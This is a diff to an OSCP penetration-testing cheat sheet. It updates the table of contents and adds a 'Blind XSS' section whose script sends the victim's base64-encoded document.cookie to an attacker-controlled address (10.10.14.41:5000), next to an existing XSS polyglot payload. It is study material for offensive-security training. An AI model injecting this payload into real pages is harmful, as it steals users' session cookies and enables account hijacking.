@@ -6,6 +6,8 @@ This repository describes cheat sheet and knowledge for OSCP.
 <!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
 **Table of Contents**
 
+- [oscp-cheatsheet](#oscp-cheatsheet)
+- [Contents](#contents)
 - [Enumeration](#enumeration)
   - [Network](#network)
     - [nmap](#nmap)
@@ -58,7 +60,7 @@ This repository describes cheat sheet and knowledge for OSCP.
         - [bitquark-subdomains-top100000.txt](#bitquark-subdomains-top100000txt)
 - [JWT (JSON Web Token) exploit](#jwt-json-web-token-exploit)
     - [Debugger](#debugger)
-    - [jwt_tool](#jwt_tool)
+    - [jwt\_tool](#jwt_tool)
       - [tampering](#tampering)
       - [exploit](#exploit)
 - [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
@@ -73,7 +75,7 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [Get privilege type from user](#get-privilege-type-from-user)
     - [Get access database](#get-access-database)
     - [Get schema names](#get-schema-names)
-    - [Get table name from information_schema](#get-table-name-from-information_schema)
+    - [Get table name from information\_schema](#get-table-name-from-information_schema)
     - [Get column name from table name](#get-column-name-from-table-name)
     - [Write shell](#write-shell)
   - [sqlmap](#sqlmap)
@@ -86,6 +88,7 @@ This repository describes cheat sheet and knowledge for OSCP.
   - [Labs for detecting operator injection](#labs-for-detecting-operator-injection)
 - [XSS](#xss)
   - [Polyglot](#polyglot)
+  - [Blind XSS for check cookie information](#blind-xss-for-check-cookie-information)
 - [Aggregating Sensitive Information](#aggregating-sensitive-information)
   - [truffleHog](#trufflehog)
     - [Scan GitHub](#scan-github)
@@ -592,6 +595,13 @@ The following script includes multiple payloads to improve the test efficiency.
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
 https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+
+## Blind XSS for check cookie information
+The following script sends the request to an attacker terminal:
+```javascript
+ <script>var i=new Image(); i.src="http://10.10.14.41:5000/?
+ cookie="+btoa(document.cookie);</script>
+ ```
 
 # Aggregating Sensitive Information
 ## truffleHog
